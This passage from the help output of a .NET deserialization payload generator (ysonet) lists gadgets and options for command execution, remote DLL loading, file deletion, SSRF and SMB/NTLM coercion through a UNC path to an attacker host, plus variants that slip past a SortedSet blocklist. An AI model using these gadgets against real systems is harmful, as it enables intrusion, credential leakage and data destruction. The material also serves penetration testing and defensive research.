			                               COMPONENT contains "~" and is at most 12
			                               characters long. So \\host\share\file calls out
			                               to nobody, and so does \\host\share\a-long-
			                               name~1\x, whose "~" component is too long.
			                               Nothing is refused here - a target's own path
			                               handling is what you are testing - but --
			                               debugmode says when the value cannot trigger the
			                               expansion.

			                               WHAT A CALLBACK PROVES. That the target resolved
			                               your host and tried to reach it. It does NOT
			                               prove a completed SMB session, NTLM
			                               authentication, captured credentials or a relay:
			                               those depend on the target, the network and your
			                               endpoint.

			                               -t IS ACCEPTED and it deserializes the payload
			                               HERE, so THIS machine does the callback to the
			                               host you named - the same as on the other
			                               network gadgets. Windows sends authentication
			                               material when it opens an SMB session, so only
			                               point -t at an endpoint you own, and do not use
			                               it on a machine whose outbound traffic you would
			                               rather not explain.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rawinput             Put -c into the payload template exactly as
			                               typed, instead of escaping it for the selected
			                               formatter. Normal mode escapes it, which is what
			                               a Windows path needs: every backslash is doubled
			                               inside a JSON string, and "&" and "<" are
			                               escaped inside the XML documents. Use this only
			                               when you have already escaped the value yourself
			                               for the format you picked. It also turns off the
			                               check that the finished payload still carries
			                               your path unchanged, because there is then no
			                               text of yours left to compare against.
			                               Default value: "false".

			Categories [variant 1]:
			  Kind: Network
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Network
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) FileSystemInfoTimeSetter [Sets a timestamp on the path you give, on the target. Any UNC path opens an SMB session to that host - no short name needed.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Xaml (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Which concrete FileSystemInfo the payload
			                               constructs. Both reach the same open of your
			                               path; they differ in which framework helper gets
			                               there.
			                               1 (default) - System.IO.DirectoryInfo. The
			                               setter calls Directory.SetXxxTimeUtc, which
			                               opens a handle with backup semantics.
			                               2 - System.IO.FileInfo. The setter calls Fil-
			                               e.SetXxxTimeUtc, which is new FileStream(path,
			                               FileMode.Open, FileAccess.Write, FileShar-
			                               e.ReadWrite, 1).

			                               WHAT TO PUT IN -c. Any path the target's file
			                               system accepts. The interesting shape is a plain
			                               UNC path:
			                                 \\attacker.example.com\share\x
			                               Unlike the serialization-constructor route,
			                               nothing here needs an MS-DOS short-name ("~")
			                               component: the path is opened directly, so any
			                               UNC path reaches the host. FileMode.Open never
			                               creates a file, so a share that does not exist
			                               still costs the target the connect.

			                               WHAT A CALLBACK PROVES. That the target resolved
			                               your host and tried to open the path. It does
			                               NOT prove a completed SMB session, NTLM
			                               authentication, captured credentials or a relay:
			                               those depend on the target, the network and your
			                               endpoint.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --member=VALUE         Which timestamp property the payload assigns.
			                               Choices: CreationTime, CreationTimeUtc,
			                               LastAccessTime, LastAccessTimeUtc, LastWriteTim-
			                               e, LastWriteTimeUtc. Default: "LastWriteTimeUtc-
			                               ".

			                               All six reach the same open of -c, so the choice
			                               matters only for a target that filters, logs or
			                               matches on the member NAME. The three ending in
			                               Utc are the real setters; the other three assign
			                               their Utc twin after ToUniversalTime(), which is
			                               the same sink one frame further out.

			                               The timestamp value is fixed at 2001-02-
			                               03T04:05:06.0000000 and is not an option,
			                               because the open happens before the value is
			                               used, so it changes nothing about whether the
			                               payload lands.

			                               -t IS ACCEPTED and it deserializes the payload
			                               HERE, so THIS machine opens the path you named -
			                               the same as on the other network gadgets.
			                               Against a UNC path that is your callback, and
			                               Windows sends authentication material when it
			                               opens an SMB session, so only point it at an
			                               endpoint you own. Against an existing LOCAL file
			                               it really does change that file's timestamp to
			                               the value above. FileMode.Open means it never
			                               creates a file that was not there.
			                               Default value: "LastWriteTimeUtc".
			                               Suggested values: CreationTime, CreationTimeUtc,
			                               LastAccessTime, LastAccessTimeUtc, LastWriteTim-
			                               e, LastWriteTimeUtc.
			      --rawinput             Put -c into the payload template exactly as
			                               typed, instead of escaping it for XML. Normal
			                               mode escapes "&", "<" and ">", which is what the
			                               text node holding your path needs. Use this only
			                               when you have already escaped the value yoursel-
			                               f. It also turns off the check that the finished
			                               payload still carries your path unchanged,
			                               because there is then no text of yours left to
			                               compare against.
			                               Default value: "false".

			Categories [variant 1]:
			  Kind: File system, Network
			  Formatter: Xaml
			  Accepted input: UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: File system, Network
			  Formatter: Xaml
			  Accepted input: UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) FileSystemProxyCurrentDirectory [Sets the target process working directory, so every later relative path in it resolves where you chose. Not code execution on its own.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractJsonSerializer, DataContractSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, NetDataContractSerializer
			Labels: An independent gadget
			Extra options:
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories:
			  Kind: File system
			  Formatter: DataContractJsonSerializer, DataContractSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, NetDataContractSerializer
			  Accepted input: Target path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) FormsIdentity [System.Web.Security.FormsIdentity (System.Web, built-in) inherits ClaimsIdentity; sets the inherited ClaimsIdentity+m_serializedClaims field, which the OnDeserialized callback base64-decodes and runs through a nested BinaryFormatter. Alternate root type for the ClaimsIdentity nested-BinaryFormatter sink.]
		Formatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget, Uses OnDeserialized attribute
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) GenericIdentity [System.Security.Principal.GenericIdentity (mscorlib, built-in) inherits ClaimsIdentity; sets the inherited ClaimsIdentity+m_serializedClaims field, which the OnDeserialized callback base64-decodes and runs through a nested BinaryFormatter. Alternate root type name for the ClaimsIdentity nested-BinaryFormatter sink.]
		Formatters: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget, Uses OnDeserialized attribute
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) GenericPrincipal (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), DataContractJsonSerializer, DataContractSerializer, LosFormatter (2), NetDataContractSerializer, SoapFormatter (2)
			Labels: A bridged gadget, Uses OnDeserialized attribute, Second order deserialization
			Supported formatter for the bridge: BinaryFormatter
			Extra options:
			      --var, --variant=VALUE Payload variant number. The (N) formatter suffix
			                               counts these variants; bare formatters support
			                               only variant 1. Choices: 1 (uses serialized
			                               ClaimsIdentities), 2 (uses serialized Claims)
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractJsonSerializer, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) GetterCompilerResults [Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework if System.CodeDom is available. DLL path delivered with -c argument] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Json.NET (4)
			Labels: Chain of arbitrary getter call, An independent gadget, Remote DLL loading for .NET 5/6/7 with WPF Enabled, Local DLL loading for .NET Framework if System.CodeDom is available
			Extra options:
			      --var, --variant=VALUE Variant number. Variant defines a different
			                               getter-call gadget. Choices:
			                               1 (default) - PropertyGrid getter-call gadget,
			                               2 - ComboBox getter-call gadget (may load DLL
			                               twice)
			                               3 - ListBox getter-call gadget
			                               4 - CheckedListBox getter-call gadget
			                               Default value: "1".
			                               Suggested values: 1, 2, 3, 4.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: Json.NET
			  Accepted input: Assembly file, UNC path
			  Requirements: .NET Framework, Modern .NET
			  Runtime versions: .NET 5.0 - 7.0
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: Json.NET
			  Accepted input: Assembly file, UNC path
			  Requirements: .NET Framework, Modern .NET
			  Runtime versions: .NET 5.0 - 7.0
			Categories [variant 3]:
			  Kind: Code execution
			  Formatter: Json.NET
			  Accepted input: Assembly file, UNC path
			  Requirements: .NET Framework, Modern .NET
			  Runtime versions: .NET 5.0 - 7.0
			Categories [variant 4]:
			  Kind: Code execution
			  Formatter: Json.NET
			  Accepted input: Assembly file, UNC path
			  Requirements: .NET Framework, Modern .NET
			  Runtime versions: .NET 5.0 - 7.0
	(*) GetterSecurityException (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Json.NET (4)
			Labels: A bridged gadget, Chain of arbitrary getter call
			Supported formatter for the bridge: BinaryFormatter
			Extra options:
			      --var, --variant=VALUE Variant number. Variant defines a different
			                               getter-call gadget. Choices:
			                               1 (default) - PropertyGrid getter-call gadget,
			                               2 - ComboBox getter-call gadget (may execute
			                               code twice)
			                               3 - ListBox getter-call gadget
			                               4 - CheckedListBox getter-call gadget
			                               Default value: "1".
			                               Suggested values: 1, 2, 3, 4.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: Json.NET
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Nested deserialization
			  Formatter: Json.NET
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 3]:
			  Kind: Nested deserialization
			  Formatter: Json.NET
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 4]:
			  Kind: Nested deserialization
			  Formatter: Json.NET
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) GetterSettingsPropertyValue (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Json.NET (4), MessagePackTypeless, MessagePackTypelessLz4, Xaml (5)
			Labels: A bridged gadget, Chain of arbitrary getter call
			Supported formatter for the bridge: BinaryFormatter
			Extra options:
			      --var, --variant=VALUE Variant number. The (N) formatter suffix counts
			                               these variants; bare MessagePack formatters
			                               support only variant 1. Variant defines a
			                               different getter-call gadget. Choices:
			                               1 (default) - PropertyGrid getter-call gadget,
			                               2 - ComboBox getter-call gadget (may execute
			                               code twice)
			                               3 - ListBox getter-call gadget
			                               4 - CheckedListBox getter-call gadget
			                               5 - BindingSource getter-call gadget (Xaml only;
			                               a Component, so no WinForms control is built on
			                               the target)
			                               Default value: "1".
			                               Suggested values: 1, 2, 3, 4, 5.

			Categories [variant 1]:
			  Kind: Nested deserialization
			  Formatter: Json.NET, MessagePackTypeless, MessagePackTypelessLz4, Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Nested deserialization
			  Formatter: Json.NET, Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 3]:
			  Kind: Nested deserialization
			  Formatter: Json.NET, Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 4]:
			  Kind: Nested deserialization
			  Formatter: Json.NET, Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 5]:
			  Kind: Nested deserialization
			  Formatter: Xaml
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) HashPEFileHandle [CLR v2 adopts -c as a native PE-file handle in System.Security.Policy.Hash, which may later crash or corrupt the target process when native code consumes or releases it. .NET 4 removed the branch. No code execution or memory read/write is proved.]
		Formatters: BinaryFormatter, LosFormatter
			Labels: An independent gadget
			Categories:
			  Kind: Denial of service
			  Formatter: BinaryFormatter, LosFormatter
			  Accepted input: Other
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 2.0
	(*) InfiniteProgressPage [Microsoft.ApplicationId.Framework.InfiniteProgressPage loads the supplied HTTP, HTTPS, FTP, or file URL through AnimatedPictureFile. This can trigger SSRF or NTLM authentication. The target needs Microsoft.ApplicationId.Framework.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: FastJson, JavaScriptSerializer, Json.NET, SharpSerializerXml, Xaml, YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories:
			  Kind: Network
			  Formatter: FastJson, JavaScriptSerializer, Json.NET, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Extra assembly
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ObjectDataProvider [Reaching a .NET Framework 3.5 target needs --legacyfx, which rewrites the PresentationFramework identity to 3.0.0.0. Measured there on XmlSerializer and JavaScriptSerializer; DataContractSerializer binds every assembly and still fails to build the projected property on the 3.0 reader. The two MessagePack Typeless cells depend on the target's MessagePack version: MessagePack carries its own hardcoded deny list, and System.Windows.Data.ObjectDataProvider joined it in 2.5.205 and in 3.1.5. Below those (2.5.198 and 3.1.4 and older, which is every release the technique was published against) the list held only TempFileCollection and IWbemClassObjectFreeThreaded and the payload fires; on 2.5.205+ or 3.1.5+ the reader refuses it by name and nothing runs.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractSerializer (2), FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml (2), XmlSerializer (2), YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Payload variant number. The (N) formatter suffix
			                               counts these variants; bare formatters support
			                               only variant 1. Choices: 1, 2 based on formatte-
			                               r. NOTE: two variants left this gadget. Variant
			                               3 was the ResourceDictionary XAML-url payload
			                               and is now the ResourceDictionary gadget, whose -
			                               c is the URI. Variant 4 was the WorkflowDesigner
			                               wrapper and is now the WorkflowDesigner gadget,
			                               which also reaches Json.NET, FastJson,
			                               JavaScriptSerializer, both SharpSerializer modes
			                               and both MessagePack Typeless flavours.
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: DataContractSerializer, FastJson, FsPickler, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml, XmlSerializer, YamlDotNet
			  Accepted input: Command
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 3.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: DataContractSerializer, Xaml, XmlSerializer
			  Accepted input: Command
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ObjRef
		Formatters: BinaryFormatter, LosFormatter, SoapFormatter
			Labels: An independent gadget
			Categories:
			  Kind: Network
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 2.0 - 4.8.1
	(*) PictureBox [System.Windows.Forms.PictureBox loads the supplied HTTP, HTTPS, FTP, or file URL through ImageLocation. This can trigger SSRF or NTLM authentication.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerXml, Xaml, YamlDotNet < 5.0.0
			Labels: An independent gadget
			Extra options:
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories:
			  Kind: Network
			  Formatter: FastJson, JavaScriptSerializer, Json.NET, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) PSObject [Target must run on a system not patched for CVE-2017-8565 (Published: 07/11/2017)]
		Formatters: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels:
			Categories:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ResourceDictionary [ResourceDictionary.Source makes the target fetch -c and load it as WPF markup. A UNC path instead coerces an SMB session, which sends authentication material.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Xaml
			Labels: An independent gadget
			Extra options:
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories:
			  Kind: Code execution, Nested deserialization, Network
			  Formatter: Xaml
			  Accepted input: Remote URL, Target path, UNC path
			  Requirements: .NET Framework, Built in, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ResourceSet (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (2), LosFormatter (2), NetDataContractSerializer (2)
			Labels: Valuable for special cases or research purposes but hidden from normal search
			Extra options:
			      --ig, --internalgadget=VALUE
			                             The numerical internal gadget choice to use:
			                               1=TypeConfuseDelegate,
			                               2=TextFormattingRunProperties (default: 1
			                               [TypeConfuseDelegate])
			                               Default value: "1".
			                               Suggested values: 1, 2.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ResXFileRef [Runs the ResXFileRef type converter on the target, which opens the -c path (a UNC path works) and builds the type named in the payload. The type name decides the effect, so pick the variant that matches what you want.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: Xaml (3), YamlDotNet < 5.0.0 (3)
			Labels: An independent gadget
			Extra options:
			      --var, --variant= stream
			                             Which of the converter's branches the payload
			                               asks for. All three open -c on the target and
			                               differ only in the TYPE NAME the payload carrie-
			                               s, which is what the converter does with the
			                               bytes. Choices:
			                               1 - read the file back. The type name is Syste-
			                               m.String, so the target runs StreamReader(path,
			                               encoding).ReadToEnd() and the file's TEXT
			                               becomes the deserialized value. Use --enc to
			                               pick the encoding. -t reads the file on THIS
			                               machine.
			                               2 (default) - load a .resources file. The type
			                               name is System.Resources.ResourceSet, whose
			                               Stream constructor runs a plain BinaryFormatter
			                               over the file, so -c should point at a-
			                                .resources document you host (build one with -p
			                               Resx -m CompiledDotResources). -t deserializes
			                               the payload HERE, which runs that
			                               BinaryFormatter over -c on THIS machine (a self-
			                               exploit) - only -t a .resources file you trust.
			                               3 (research) - activate a type you name with --
			                               type. The target reads the whole file into a
			                               MemoryStream and calls Activato-
			                               r.CreateInstance(yourType, ..., new object[]
			                               stream ), so the type needs one public instance
			                               constructor taking a Stream. This is an escape
			                               hatch, NOT a stronger version of variant 2: what
			                               happens is decided by the type you chose and
			                               ysonet cannot know it. -t activates that type on
			                               THIS machine, so only -t a type and file you
			                               trust.
			                               Default value: "2".
			                               Suggested values: 1, 2, 3.
			      --type=VALUE           Variant 3 only: the type the TARGET resolves
			                               with Type.GetType and then activates with the
			                               file's bytes. Give an assembly qualified name
			                               ("Some.Namespace.SomeType, SomeAssembly") unless
			                               it is an mscorlib type, which resolves from its
			                               bare name. It must have a public instance
			                               constructor taking one System.IO.Stream; a name
			                               that does not resolve makes the target throw,
			                               loudly, before anything is read.
			      --enc=VALUE            Variant 1 only: the encoding name the target
			                               passes to Encoding.GetEncoding for the text rea-
			                               d, for example utf-8 or windows-1252. Leave it
			                               out and the target uses Encoding.Default.
			      --rawinput             Pass -c verbatim into the payload template
			                               instead of escaping it for the selected
			                               formatter. Use this only for already-escaped
			                               input.
			                               Default value: "false".

			Categories [variant 1]:
			  Kind: File system, Information disclosure, Network
			  Formatter: Xaml, YamlDotNet
			  Accepted input: Target path, UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution, File system, Nested deserialization, Network
			  Formatter: Xaml, YamlDotNet
			  Accepted input: Target path, UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
			Categories [variant 3]:
			  Kind: File system, Other
			  Formatter: Xaml, YamlDotNet
			  Accepted input: Target path, UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) RolePrincipal
		Formatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) SessionSecurityToken
		Formatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) SessionViewStateHistoryItem
		Formatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: LosFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) TempFileCollection [Targets the [Serializable] TempFileCollection in the .NET Framework's in-box System.dll, not the NuGet copy. It deletes target paths on dispose/finalize; -t DELETES them HERE. Below 4.0 strict readers need --legacyfx.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels: An independent gadget
			Extra options:
			      --extrafile=VALUE      An ADDITIONAL path to delete on the target.
			                               Repeat the option once per extra path (--
			                               extrafile "C:\a.txt" --extrafile "C:\b.txt"); -c
			                               supplies the first one. A repeatable option is
			                               used instead of a separator convention because a
			                               Windows path may legitimately contain almost any
			                               punctuation. Every path is a path on the TARGET:
			                               it is never opened, resolved, canonicalized or
			                               checked here, so a relative path resolves
			                               against the deserializing process's working
			                               directory. Paths that differ only by case are
			                               collapsed to one entry, and an empty or
			                               whitespace-only value is refused. UNC paths are
			                               accepted because File.Delete accepts them. The
			                               deletion happens when the target disposes or
			                               finalizes the object, which may be immediate,
			                               much later, or never if the process exits first,
			                               and the framework swallows every failure, so
			                               nothing reports back.

			Categories:
			  Kind: File system
			  Formatter: BinaryFormatter, DataContractSerializer, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Target path, UNC path
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 2.0 - 4.8.1
	(*) TextFormattingRunProperties [This normally generates the shortest payload] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			Labels:
			Extra options:
			      --xamlurl=VALUE        This is to create a very short payload when the
			                               affected box can read the target XAML URL e.g.
			                               "http://example.local/x" (can be a UNC path on a
			                               shared drive or a path on the local system). It
			                               carries the ResourceDictionary gadget instead of
			                               ObjectDataProvider, so the target FETCHES and
			                               loads that URL rather than running a command,
			                               and the command parameter is ignored. The
			                               shorter the better!
			      --hasRootDCS           Include a root element with the
			                               DataContractSerializer payload. This option
			                               applies only to DataContractSerializer; other
			                               formatters are refused.
			                               Default value: "false".

			Categories:
			  Kind: Code execution
			  Formatter: BinaryFormatter, DataContractSerializer, Json.NET, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Extra assembly, WPF
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) ToolboxItemContainer
		Formatters: BinaryFormatter, LosFormatter, SoapFormatter
			Labels: A bridged gadget
			Supported formatter for the bridge: BinaryFormatter
			Categories:
			  Kind: Nested deserialization
			  Formatter: BinaryFormatter, LosFormatter, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1
	(*) TypeConfuseDelegate [Combines a Comparison<string> with itself, wraps it with Comparer<string>.Create, then swaps invocation-list slot 1 for Process.Start(string, string). The sorted container calls the comparer while rebuilding on deserialize, and the confused return type runs the command. The var/variant option picks the serialized root container: 1 (default) SortedSet<string>; 2 SortedDictionary<string,string>, whose serialized TreeSet<KeyValuePair<string,string>> backing set forwards key comparisons through SortedDictionary.KeyValuePairComparer; 3 the internal System.Collections.Generic.TreeSet<string>, built by reflection. Variants 2 and 3 exist for one narrow case: a binder or blocklist that rejects the exact wire type name System.Collections.Generic.SortedSet but allows the other roots. They do not defeat an allowlist, a rule that also names TreeSet, or a policy that resolves types and rejects SortedSet subclasses (TreeSet derives from SortedSet). Variants 2 and 3 refuse an input whose executable and argument strings compare equal, because both roots reject a duplicate key; variant 1 accepts it but its SortedSet then holds one element and does not fire, so make the two strings differ. SoapFormatter is a direct CLR4 document for variants 1 and 3: the target sees the native SortedSet<string> or TreeSet<string> root and ComparisonComparer<string>, with no Workflow surrogate, outer carrier, or nested BinaryFormatter stream. Variant 2 does not support SoapFormatter. All three variants target .NET Framework 4.5+; use TypeConfuseDelegateNetFx40 for exactly .NET Framework 4.0 or TypeConfuseDelegateNetFx35 for .NET Framework 3.5 / CLR2. --legacyfx is not supported because rewriting assembly versions cannot turn this Comparer<T>.Create graph into a CLR2 graph.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3), LosFormatter (3), NetDataContractSerializer (3), SoapFormatter (2)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE Root container: 1 -> SortedSet [default], 2 ->
			                               SortedDictionary, 3 -> TreeSet (2 and 3 evade an
			                               exact SortedSet wire-name blocklist and need
			                               distinct command and argument strings)
			                               Default value: "1".
			                               Suggested values: 1, 2, 3.

			Categories [variant 1]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 2]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
			Categories [variant 3]:
			  Kind: Code execution
			  Formatter: BinaryFormatter, LosFormatter, NetDataContractSerializer, SoapFormatter
			  Accepted input: Command
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.5 - 4.8.1
	(*) TypeConfuseDelegateFileOperations [Performs a file operation on the target through the TypeConfuseDelegate delegate confusion, without starting a process: write text from a local file, copy, move, move a directory, or create/truncate an empty file. The var/variant option picks the operation and decides what -c means; the two strings only have to DIFFER, in either order. This CLR4.5+ graph does not support --legacyfx.] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (5), LosFormatter (5), NetDataContractSerializer (5), SoapFormatter (5)
			Labels: An independent gadget
			Extra options:
			      --var, --variant=VALUE File operation: 1 -> write text from a local
			                               file [default] (-c "targetPat-
